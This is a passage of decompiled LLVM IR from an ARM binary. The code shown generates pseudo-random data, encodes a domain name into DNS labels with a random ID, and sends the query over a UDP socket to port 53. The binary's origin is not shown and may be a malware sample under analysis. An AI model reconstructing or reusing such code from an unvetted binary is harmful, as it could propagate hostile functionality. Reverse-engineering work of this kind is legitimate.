  store i32 %v3_10db4, i32* %stack_var_-36, align 4
  %v9_10db4 = load i32, i32* @r6, align 4
  %v12_10db4 = load i32, i32* @r7, align 4
  %v15_10db4 = load i32, i32* @r8, align 4
  %v18_10db4 = load i32, i32* @sb, align 4
  %v21_10db4 = load i32, i32* @sl, align 4
  %v24_10db4 = load i32, i32* @fp, align 4
  %v0_10db8 = load i32, i32* @r1, align 4
  store i32 %v0_10db8, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %tmp20 = icmp slt i32 %v0_10db8, 1
  br i1 %tmp20, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_10db4
  store i32 %v3_10db4, i32* @r4, align 4
  ret i32 %tmp

bb21:                                             ; preds = %dec_label_pc_10db4
  store i32 ptrtoint (i32* @global_var_1cdb8.217 to i32), i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cdb4.221 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cdb0.219 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cdac.215 to i32), i32* %r8.global-to-local, align 4
  %v2_10dd4 = load i32, i32* @global_var_1cdb8.217, align 4
  store i32 %v2_10dd4, i32* %lr.global-to-local, align 4
  %v2_10dd8 = load i32, i32* @global_var_1cdb4.221, align 4
  store i32 %v2_10dd8, i32* %r7.global-to-local, align 4
  %v2_10ddc = load i32, i32* @global_var_1cdb0.219, align 4
  store i32 %v2_10ddc, i32* %r6.global-to-local, align 4
  %v2_10de0 = load i32, i32* @global_var_1cdac.215, align 4
  br label %dec_label_pc_10e0c

dec_label_pc_10de8:                               ; preds = %dec_label_pc_10e38
  %v3_10e40 = sdiv i32 %v5_10e24, 256
  %v1_10de8 = trunc i32 %v3_10e40 to i8
  %v3_10de8 = add i32 %v9_10e2c, 1
  %v4_10de8 = inttoptr i32 %v3_10de8 to i8*
  store i8 %v1_10de8, i8* %v4_10de8, align 1
  %v0_10dec = load i32, i32* %r3.global-to-local, align 4
  %v1_10dec = trunc i32 %v0_10dec to i8
  %v2_10dec = load i32, i32* %r5.global-to-local, align 4
  %v3_10dec = inttoptr i32 %v2_10dec to i8*
  store i8 %v1_10dec, i8* %v3_10dec, align 1
  %v0_10df0 = load i32, i32* %r5.global-to-local, align 4
  %v1_10df0 = add i32 %v0_10df0, 2
  store i32 %v1_10df0, i32* %r5.global-to-local, align 4
  %v0_10df4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10df4

dec_label_pc_10df4:                               ; preds = %.thread, %dec_label_pc_10de8
  %v0_10df4 = phi i32 [ %v9_10e30, %.thread ], [ %v0_10df4.pre, %dec_label_pc_10de8 ]
  %v2_10de87 = phi i32 [ %v12_10e2c, %.thread ], [ %v1_10df0, %dec_label_pc_10de8 ]
  %tmp22 = icmp slt i32 %v0_10df4, 1
  br i1 %tmp22, label %dec_label_pc_10e74, label %dec_label_pc_10e00

dec_label_pc_10e00:                               ; preds = %dec_label_pc_10df4
  %v0_10df8 = load i32, i32* %r6.global-to-local, align 4
  %v0_10e00 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10e00, i32* %r6.global-to-local, align 4
  %v0_10e04 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_10e04, i32* %r7.global-to-local, align 4
  %v0_10e08 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10e08, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10e0c

dec_label_pc_10e0c:                               ; preds = %bb21, %dec_label_pc_10e00
  %v0_10e5c = phi i32 [ %v2_10ddc, %bb21 ], [ %v0_10e00, %dec_label_pc_10e00 ]
  %v9_10e2c = phi i32 [ %tmp, %bb21 ], [ %v2_10de87, %dec_label_pc_10e00 ]
  %v0_10e44 = phi i32 [ %v0_10db8, %bb21 ], [ %v0_10df4, %dec_label_pc_10e00 ]
  %v0_10e50 = phi i32 [ %v2_10dd4, %bb21 ], [ %v0_10e08, %dec_label_pc_10e00 ]
  %v0_10e4c = phi i32 [ %v2_10de0, %bb21 ], [ %v0_10df8, %dec_label_pc_10e00 ]
  %v4_10e0c = mul i32 %v0_10e4c, 2048
  %v5_10e0c = xor i32 %v4_10e0c, %v0_10e4c
  %v4_10e10 = udiv i32 %v0_10e50, 524288
  %v5_10e10 = xor i32 %v4_10e10, %v0_10e50
  %v2_10e14 = xor i32 %v5_10e10, %v5_10e0c
  %v4_10e24 = udiv i32 %v5_10e0c, 256
  %v5_10e24 = xor i32 %v4_10e24, %v2_10e14
  store i32 %v5_10e24, i32* %r3.global-to-local, align 4
  %v7_10e2c = icmp sgt i32 %v0_10e44, 3
  br i1 %v7_10e2c, label %.thread, label %dec_label_pc_10e38

.thread:                                          ; preds = %dec_label_pc_10e0c
  %v10_10e2c = inttoptr i32 %v9_10e2c to i32*
  store i32 %v5_10e24, i32* %v10_10e2c, align 4
  %v11_10e2c = load i32, i32* %r5.global-to-local, align 4
  %v12_10e2c = add i32 %v11_10e2c, 4
  store i32 %v12_10e2c, i32* %r5.global-to-local, align 4
  %v8_10e30 = load i32, i32* %r4.global-to-local, align 4
  %v9_10e30 = add i32 %v8_10e30, -4
  store i32 %v9_10e30, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10df4

dec_label_pc_10e38:                               ; preds = %dec_label_pc_10e0c
  store i32 %v5_10e24, i32* %r3.global-to-local, align 4
  %v7_10e3c = icmp eq i32 %v0_10e44, 1
  %v1_10e44 = add i32 %v0_10e44, -2
  store i32 %v1_10e44, i32* %r4.global-to-local, align 4
  br i1 %v7_10e3c, label %dec_label_pc_10e4c, label %dec_label_pc_10de8

dec_label_pc_10e4c:                               ; preds = %dec_label_pc_10e38
  store i32 %v5_10e24, i32* %r3.global-to-local, align 4
  %v1_10e5c = load i32, i32* %r8.global-to-local, align 4
  %v2_10e5c = inttoptr i32 %v1_10e5c to i32*
  store i32 %v0_10e5c, i32* %v2_10e5c, align 4
  %v0_10e60 = load i32, i32* %r7.global-to-local, align 4
  %v1_10e60 = load i32, i32* %sl.global-to-local, align 4
  %v2_10e60 = inttoptr i32 %v1_10e60 to i32*
  store i32 %v0_10e60, i32* %v2_10e60, align 4
  %v0_10e64 = load i32, i32* %lr.global-to-local, align 4
  %v1_10e64 = load i32, i32* %sb.global-to-local, align 4
  %v2_10e64 = inttoptr i32 %v1_10e64 to i32*
  store i32 %v0_10e64, i32* %v2_10e64, align 4
  %v0_10e68 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e68 = load i32, i32* %fp.global-to-local, align 4
  %v2_10e68 = inttoptr i32 %v1_10e68 to i32*
  store i32 %v0_10e68, i32* %v2_10e68, align 4
  %v0_10e6c = load i32, i32* %r3.global-to-local, align 4
  %v1_10e6c = trunc i32 %v0_10e6c to i8
  %v2_10e6c = load i32, i32* %r5.global-to-local, align 4
  %v3_10e6c = inttoptr i32 %v2_10e6c to i8*
  store i8 %v1_10e6c, i8* %v3_10e6c, align 1
  %v2_10e70 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_10e70, i32* @r4, align 4
  store i32 %v9_10db4, i32* @r6, align 4
  store i32 %v12_10db4, i32* @r7, align 4
  store i32 %v15_10db4, i32* @r8, align 4
  store i32 %v18_10db4, i32* @sb, align 4
  store i32 %v21_10db4, i32* @sl, align 4
  store i32 %v24_10db4, i32* @fp, align 4
  ret i32 %v5_10e0c

dec_label_pc_10e74:                               ; preds = %dec_label_pc_10df4
  %v0_10e74 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e74 = load i32, i32* %fp.global-to-local, align 4
  %v2_10e74 = inttoptr i32 %v1_10e74 to i32*
  store i32 %v0_10e74, i32* %v2_10e74, align 4
  %v0_10e78 = load i32, i32* %lr.global-to-local, align 4
  %v1_10e78 = load i32, i32* %sb.global-to-local, align 4
  %v2_10e78 = inttoptr i32 %v1_10e78 to i32*
  store i32 %v0_10e78, i32* %v2_10e78, align 4
  %v0_10e7c = load i32, i32* %r7.global-to-local, align 4
  %v1_10e7c = load i32, i32* %sl.global-to-local, align 4
  %v2_10e7c = inttoptr i32 %v1_10e7c to i32*
  store i32 %v0_10e7c, i32* %v2_10e7c, align 4
  %v0_10e80 = load i32, i32* %r6.global-to-local, align 4
  %v1_10e80 = load i32, i32* %r8.global-to-local, align 4
  %v2_10e80 = inttoptr i32 %v1_10e80 to i32*
  store i32 %v0_10e80, i32* %v2_10e80, align 4
  %v2_10e84 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_10e84, i32* @r4, align 4
  store i32 %v9_10db4, i32* @r6, align 4
  store i32 %v12_10db4, i32* @r7, align 4
  store i32 %v15_10db4, i32* @r8, align 4
  store i32 %v18_10db4, i32* @sb, align 4
  store i32 %v21_10db4, i32* @sl, align 4
  store i32 %v24_10db4, i32* @fp, align 4
  ret i32 %v5_10e0c

; uselistorder directives
  uselistorder i32 %v9_10e30, { 1, 0 }
  uselistorder i32 %v12_10e2c, { 1, 0 }
  uselistorder i32 %v5_10e24, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v5_10e0c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10e4c, { 1, 0 }
  uselistorder i32 %v0_10e50, { 1, 0 }
  uselistorder i32 %v0_10df4, { 1, 0 }
  uselistorder i32 %v24_10db4, { 1, 0 }
  uselistorder i32 %v21_10db4, { 1, 0 }
  uselistorder i32 %v18_10db4, { 1, 0 }
  uselistorder i32 %v15_10db4, { 1, 0 }
  uselistorder i32 %v12_10db4, { 1, 0 }
  uselistorder i32 %v9_10db4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 5, 0, 3, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 5, 0, 1, 2, 4, 7, 6, 3 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_1cdac.215, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_1cdb0.219, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32* @global_var_1cdb4.221, { 3, 6, 1, 4, 2, 0, 5 }
  uselistorder i32* @global_var_1cdb8.217, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_10e0c, { 1, 0 }
}

define i32 @function_10e98(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10e98:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_10e98 = load i32, i32* @r4, align 4
  store i32 %v3_10e98, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_10e9c = icmp eq i32* %arg1, null
  br i1 %v2_10e9c, label %bb, label %bb4

bb:                                               ; preds = %dec_label_pc_10e98
  store i32 %v3_10e98, i32* @r4, align 4
  ret i32 %tmp

bb4:                                              ; preds = %dec_label_pc_10e98
  %v1_10ea4 = add i32 %tmp, 4
  %v2_10ea4 = inttoptr i32 %v1_10ea4 to i32*
  %v3_10ea4 = load i32, i32* %v2_10ea4, align 4
  %v1_10eac = icmp ne i32 %v3_10ea4, 0
  call void @__pseudo_cond_branch(i1 %v1_10eac, i32 ptrtoint (i32* @global_var_8de4.114 to i32))
  %v0_10eb0 = load i32, i32* %r4.global-to-local, align 4
  %v2_10eb4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10eb4, i32* @r4, align 4
  %v1_10eb8 = inttoptr i32 %v0_10eb0 to i32*
  call void @free(i32* %v1_10eb8)
  ret i32 ptrtoint (i32* @0 to i32)
}

define i32 @function_10ebc(i8* %arg1) local_unnamed_addr {
dec_label_pc_10ebc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-4288 = alloca i8, align 1
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2227 = alloca i32, align 4
  %stack_var_-2240 = alloca i8, align 1
  %stack_var_-2228 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10ebc = load i32, i32* @r4, align 4
  store i32 %v3_10ebc, i32* %stack_var_-36, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10ed4 = call i32 @_calloc(i32 1, i32 8)
  %v0_10edc = load i32, i32* %r4.global-to-local, align 4
  %v1_10edc = inttoptr i32 %v0_10edc to i8*
  store i32 %v0_10edc, i32* %r0.global-to-local, align 4
  %v3_10ee0 = call i32 @function_13a54(i8* %v1_10edc)
  %v2_10ee8 = ptrtoint i32* %stack_var_-2228 to i32
  store i32 %v2_10ee8, i32* %fp.global-to-local, align 4
  %v2_10eec = ptrtoint i8* %stack_var_-2240 to i32
  %v1_10ef0 = add i32 %v3_10ee0, 1
  store i32 %v1_10ef0, i32* %r0.global-to-local, align 4
  %v2_10ef4 = ptrtoint i32* %stack_var_-2227 to i32
  store i32 %v2_10ef4, i32* %r2.global-to-local, align 4
  store i32 %v2_10ee8, i32* %r5.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_10f34162 = icmp eq i32 %v1_10ef0, 0
  store i1 %v2_10f34162, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_10f3c163 = or i32 %v2_10ef4, 1
  store i32 %v1_10f3c163, i32* %r1.global-to-local, align 4
  %tmp124164 = icmp slt i32 %v1_10ef0, 1
  br i1 %tmp124164, label %dec_label_pc_10f44, label %dec_label_pc_10f04.lr.ph

dec_label_pc_10f04.lr.ph:                         ; preds = %dec_label_pc_10ebc
  %v0_10f04.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10f04

dec_label_pc_10f04:                               ; preds = %dec_label_pc_10f04.lr.ph, %.thread12
  %v1_10f18176.off0 = phi i8 [ 0, %dec_label_pc_10f04.lr.ph ], [ %extract.t179, %.thread12 ]
  %v0_10f04 = phi i32 [ %v0_10f04.pre, %dec_label_pc_10f04.lr.ph ], [ %v1_10f28, %.thread12 ]
  %v2_10f48165 = phi i32 [ %v2_10ef4, %dec_label_pc_10f04.lr.ph ], [ %v0_10f30, %.thread12 ]
  %v1_10f04 = inttoptr i32 %v0_10f04 to i8*
  %v2_10f04 = load i8, i8* %v1_10f04, align 1
  %v3_10f04 = zext i8 %v2_10f04 to i32
  store i32 %v3_10f04, i32* %r3.global-to-local, align 4
  %v2_10f08 = icmp eq i8 %v2_10f04, 0
  store i1 %v2_10f08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10f08, label %.thread6, label %bb

bb:                                               ; preds = %dec_label_pc_10f04
  %v8_10f0c = icmp eq i8 %v2_10f04, 46
  store i1 %v8_10f0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10f0c, label %.thread6, label %.thread

.thread:                                          ; preds = %bb
  %v4_10f10 = inttoptr i32 %v2_10f48165 to i8*
  store i8 %v2_10f04, i8* %v4_10f10, align 1
  %v5_10f10 = load i32, i32* %r2.global-to-local, align 4
  %v6_10f10 = add i32 %v5_10f10, 1
  store i32 %v6_10f10, i32* %r2.global-to-local, align 4
  %v0_10f14.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10f14.pr.pr, label %.thread..thread6_crit_edge, label %bb122

.thread..thread6_crit_edge:                       ; preds = %.thread
  %v1_10f18.pre = load i32, i32* %lr.global-to-local, align 4
  %extract.t = trunc i32 %v1_10f18.pre to i8
  br label %.thread6

.thread6:                                         ; preds = %.thread..thread6_crit_edge, %bb, %dec_label_pc_10f04
  %v1_10f18.off0 = phi i8 [ %extract.t, %.thread..thread6_crit_edge ], [ %v1_10f18176.off0, %bb ], [ %v1_10f18176.off0, %dec_label_pc_10f04 ]
  %v3_10f18 = load i32, i32* %r5.global-to-local, align 4
  %v4_10f18 = inttoptr i32 %v3_10f18 to i8*
  store i8 %v1_10f18.off0, i8* %v4_10f18, align 1
  %v0_10f1c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10f1c.pr, label %bb123, label %..thread12_crit_edge

bb122:                                            ; preds = %.thread
  store i32 %v6_10f10, i32* %r1.global-to-local, align 4
  %v1_10f1c = load i32, i32* %ip.global-to-local, align 4
  %v2_10f1c = urem i32 %v1_10f1c, 256
  store i32 %v2_10f1c, i32* %lr.global-to-local, align 4
  br label %.thread12

..thread12_crit_edge:                             ; preds = %.thread6
  %v1_10f1c10 = load i32, i32* %ip.global-to-local, align 4
  %v2_10f1c11 = urem i32 %v1_10f1c10, 256
  store i32 %v2_10f1c11, i32* %lr.global-to-local, align 4
  br label %.thread12

bb123:                                            ; preds = %.thread6
  %v1_10f20.pre = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_10f20.pre, i32* %r5.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb122, %..thread12_crit_edge, %bb123
  %v0_10f38.pre = phi i32 [ %v2_10f1c11, %..thread12_crit_edge ], [ %v2_10f1c, %bb122 ], [ 0, %bb123 ]
  %v0_10f28 = load i32, i32* %r4.global-to-local, align 4
  %v1_10f28 = add i32 %v0_10f28, 1
  store i32 %v1_10f28, i32* %r4.global-to-local, align 4
  %v0_10f2c = load i32, i32* %r0.global-to-local, align 4
  %v1_10f2c = add i32 %v0_10f2c, -1
  store i32 %v1_10f2c, i32* %r0.global-to-local, align 4
  %v0_10f30 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_10f30, i32* %r2.global-to-local, align 4
  %v2_10f34 = icmp eq i32 %v1_10f2c, 0
  store i1 %v2_10f34, i1* %cpsr_z.global-to-local, align 1
  %v1_10f38 = add nuw nsw i32 %v0_10f38.pre, 1
  store i32 %v1_10f38, i32* %ip.global-to-local, align 4
  %v1_10f3c = add i32 %v0_10f30, 1
  store i32 %v1_10f3c, i32* %r1.global-to-local, align 4
  %tmp124 = icmp slt i32 %v1_10f2c, 1
  %extract.t179 = trunc i32 %v0_10f38.pre to i8
  br i1 %tmp124, label %dec_label_pc_10f44, label %dec_label_pc_10f04

dec_label_pc_10f44:                               ; preds = %.thread12, %dec_label_pc_10ebc
  %v2_10f48.lcssa = phi i32 [ %v2_10ef4, %dec_label_pc_10ebc ], [ %v0_10f30, %.thread12 ]
  %v3_10ed4 = inttoptr i32 %v2_10ed4 to i8*
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_10f48 = inttoptr i32 %v2_10f48.lcssa to i8*
  store i8 0, i8* %v3_10f48, align 1
  store i32 %v2_10ee8, i32* %r0.global-to-local, align 4
  %v1_10f50 = bitcast i32* %stack_var_-2228 to i8*
  %v2_10f50 = call i32 @function_13a54(i8* %v1_10f50)
  %v2_10f54 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_10f54, i32* %r1.global-to-local, align 4
  %v0_10f58 = load i32, i32* %fp.global-to-local, align 4
  %v2_10f58 = add i32 %v0_10f58, %v2_10f50
  store i32 %v2_10f58, i32* %r5.global-to-local, align 4
  %v0_10f5c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10f5c, i32* %stack_var_-64, align 4
  store i32 %v2_10ee8, i32* %r0.global-to-local, align 4
  %v2_10f70 = call i32 @function_13a54(i8* %v1_10f50)
  %v1_10f74 = add i32 %v2_10f70, 17
  store i32 %v1_10f74, i32* %r0.global-to-local, align 4
  %v0_10f7c = call i32 @function_10bd8()
  %v2_10f88 = urem i32 %v0_10f7c, 65535
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %v2_10f88, i32* %r3.global-to-local, align 4
  %v2_10f9c = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_10f9c, i32* %r0.global-to-local, align 4
  %v2_10fa4 = call i32 @function_13af4(i32 %v2_10f9c, i32 16)
  %sext = mul i32 %v2_10f88, 16777216
  %v4_10fa8 = sdiv i32 %sext, 16777216
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %v2_10f54, i32* %r3.global-to-local, align 4
  store i32 53, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v4_10fa8, i32* %lr.global-to-local, align 4
  %v0_10ff0 = load i32, i32* %r5.global-to-local, align 4
  %v2_10ff0 = add i32 %v0_10ff0, 1
  store i32 %v2_10ff0, i32* %ip.global-to-local, align 4
  %v2_10ff4 = ptrtoint i8* %stack_var_-4288 to i32
  store i32 %v2_10ff4, i32* %r1.global-to-local, align 4
  %v5_10ff8 = trunc i32 %v4_10fa8 to i8
  store i8 %v5_10ff8, i8* %stack_var_-2240, align 1
  %v0_11010 = load i32, i32* %r4.global-to-local, align 4
  %v1_11010 = trunc i32 %v0_11010 to i8
  %v4_11010 = inttoptr i32 %v2_10ff0 to i8*
  store i8 %v1_11010, i8* %v4_11010, align 1
  %v0_11014 = load i32, i32* %r4.global-to-local, align 4
  %v1_11014 = trunc i32 %v0_11014 to i8
  %v2_11014 = load i32, i32* %ip.global-to-local, align 4
  %v3_11014 = add i32 %v2_11014, 2
  %v4_11014 = inttoptr i32 %v3_11014 to i8*
  store i8 %v1_11014, i8* %v4_11014, align 1
  %v0_11018 = load i32, i32* %r0.global-to-local, align 4
  %v1_11018 = trunc i32 %v0_11018 to i8
  %v2_11018 = load i32, i32* %ip.global-to-local, align 4
  %v3_11018 = add i32 %v2_11018, 3
  %v4_11018 = inttoptr i32 %v3_11018 to i8*
  store i8 %v1_11018, i8* %v4_11018, align 1
  %v0_1101c = load i32, i32* %r0.global-to-local, align 4
  %v1_1101c = trunc i32 %v0_1101c to i8
  %v2_1101c = load i32, i32* %ip.global-to-local, align 4
  %v3_1101c = add i32 %v2_1101c, 1
  %v4_1101c = inttoptr i32 %v3_1101c to i8*
  store i8 %v1_1101c, i8* %v4_1101c, align 1
  %v0_11024 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11024, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1102c = ptrtoint i32* %stack_var_-192 to i32
  store i32 %v2_1102c, i32* %r6.global-to-local, align 4
  %v2_110d0 = ptrtoint i32* %stack_var_-36 to i32
  %v2_110fc = ptrtoint i32* %stack_var_-48 to i32
  %v1_111d4 = add i32 %v2_10ff4, 12
  %v1_111dc = inttoptr i32 %v1_111d4 to i8*
  %v1_111f0 = add i32 %v2_10ff4, 1
  %v2_111f0 = inttoptr i32 %v1_111f0 to i8*
  %v1_1120c = add i32 %v2_10ff4, 6
  %v2_1120c = inttoptr i32 %v1_1120c to i8*
  %v1_11210 = add i32 %v2_10ff4, 7
  %v2_11210 = inttoptr i32 %v1_11210 to i8*
  br label %dec_label_pc_11030

dec_label_pc_11030:                               ; preds = %dec_label_pc_11184, %dec_label_pc_10f44
  %v1_11034 = phi i32 [ %v0_11030.pre, %dec_label_pc_11184 ], [ -1, %dec_label_pc_10f44 ]
  %v7_11030 = icmp eq i32 %v1_11034, -1
  store i1 %v7_11030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11030, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_11030
  store i32 %v1_11034, i32* %r0.global-to-local, align 4
  br label %bb126

bb126:                                            ; preds = %dec_label_pc_11030, %bb125
  store i32 69692, i32* %lr.global-to-local, align 4
  %v1_11038 = xor i1 %v7_11030, true
  call void @__pseudo_cond_branch(i1 %v1_11038, i32 ptrtoint (i32* @global_var_8dcc.81 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_11048 = call i32 @_socket(i32 2, i32 2, i32 0)
  store i32 %v3_11048, i32* @r0, align 4
  %v7_1104c = icmp eq i32 %v3_11048, -1
  store i1 %v7_1104c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_11048, i32* %r7.global-to-local, align 4
  br i1 %v7_1104c, label %dec_label_pc_111c4, label %dec_label_pc_11058

dec_label_pc_11058:                               ; preds = %bb126
  store i32 %v2_10f9c, i32* @r1, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_11064 = call i32 @_connect(i32 %v3_11048, i32 %v2_10f9c, i32 16)
  store i32 %v3_11064, i32* %r0.global-to-local, align 4
  %v7_11068 = icmp eq i32 %v3_11064, -1
  store i1 %v7_11068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11068, label %dec_label_pc_1118c, label %dec_label_pc_11070

dec_label_pc_11070:                               ; preds = %dec_label_pc_11058
  %v0_11070 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11070, i32* %r0.global-to-local, align 4
  store i32 %v2_10eec, i32* %r1.global-to-local, align 4
  store i32 %v1_10f74, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11080 = call i32 @_send(i32 %v0_11070, i32 %v2_10eec, i32 %v1_10f74, i32 16384)
  store i32 %v4_11080, i32* %r0.global-to-local, align 4
  %v7_11084 = icmp eq i32 %v4_11080, -1
  store i1 %v7_11084, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11084, label %dec_label_pc_1118c, label %dec_label_pc_1108c

dec_label_pc_1108c:                               ; preds = %dec_label_pc_11070
  %v0_1108c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1108c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_11098 = call i32 (i32, i32, ...) @fcntl(i32 3, i32 %v0_1108c)
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_110a0 = or i32 %v2_11098, 2048
  store i32 %v1_110a0, i32* %r2.global-to-local, align 4
  %v0_110a4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_110a4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_110ac = call i32 (i32, i32, ...) @fcntl(i32 4, i32 %v0_110a4)
  store i32 %v2_110ac, i32* %r0.global-to-local, align 4
  %v0_110b0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_110b0, i32* %r3.global-to-local, align 4
  %v2_110b4154 = load i32, i32* %r6.global-to-local, align 4
  %v3_110b4155 = add i32 %v2_110b4154, %v0_110b0
  %v4_110b4156 = inttoptr i32 %v3_110b4155 to i32*
  store i32 %v0_110b0, i32* %v4_110b4156, align 4
  %v0_110b8157 = load i32, i32* %r3.global-to-local, align 4
  %v1_110b8158 = add i32 %v0_110b8157, 4
  store i32 %v1_110b8158, i32* %r3.global-to-local, align 4
  %v7_110bc159 = icmp eq i32 %v1_110b8158, 128
  br i1 %v7_110bc159, label %dec_label_pc_110c4, label %dec_label_pc_110b4.dec_label_pc_110b4_crit_edge

dec_label_pc_110b4.dec_label_pc_110b4_crit_edge:  ; preds = %dec_label_pc_1108c, %dec_label_pc_110b4.dec_label_pc_110b4_crit_edge
  %v1_110b8160 = phi i32 [ %v1_110b8, %dec_label_pc_110b4.dec_label_pc_110b4_crit_edge ], [ %v1_110b8158, %dec_label_pc_1108c ]
  %v0_110b4.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_110b4 = load i32, i32* %r6.global-to-local, align 4
  %v3_110b4 = add i32 %v2_110b4, %v1_110b8160
  %v4_110b4 = inttoptr i32 %v3_110b4 to i32*
  store i32 %v0_110b4.pre, i32* %v4_110b4, align 4
  %v0_110b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_110b8 = add i32 %v0_110b8, 4
  store i32 %v1_110b8, i32* %r3.global-to-local, align 4
  %v7_110bc = icmp eq i32 %v1_110b8, 128
  br i1 %v7_110bc, label %dec_label_pc_110c4, label %dec_label_pc_110b4.dec_label_pc_110b4_crit_edge

dec_label_pc_110c4:                               ; preds = %dec_label_pc_110b4.dec_label_pc_110b4_crit_edge, %dec_label_pc_1108c
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_110c4 = load i32, i32* %r7.global-to-local, align 4
  %v3_110c4 = udiv i32 %v0_110c4, 32
  %v3_110cc = mul nuw nsw i32 %v3_110c4, 4
  store i32 %v3_110cc, i32* %r3.global-to-local, align 4
  store i32 %v2_110d0, i32* %r2.global-to-local, align 4
  %v2_110d4 = add i32 %v3_110cc, %v2_110d0
  store i32 %v2_110d4, i32* %r5.global-to-local, align 4
  %v1_110d8 = add i32 %v2_110d4, -156
  %v2_110d8 = inttoptr i32 %v1_110d8 to i32*
  %v3_110d8 = load i32, i32* %v2_110d8, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_110e0 = urem i32 %v0_110c4, 32
  store i32 %v1_110e0, i32* %r8.global-to-local, align 4
  %v7_110e4 = shl i32 1, %v1_110e0
  %v8_110e4 = or i32 %v3_110d8, %v7_110e4
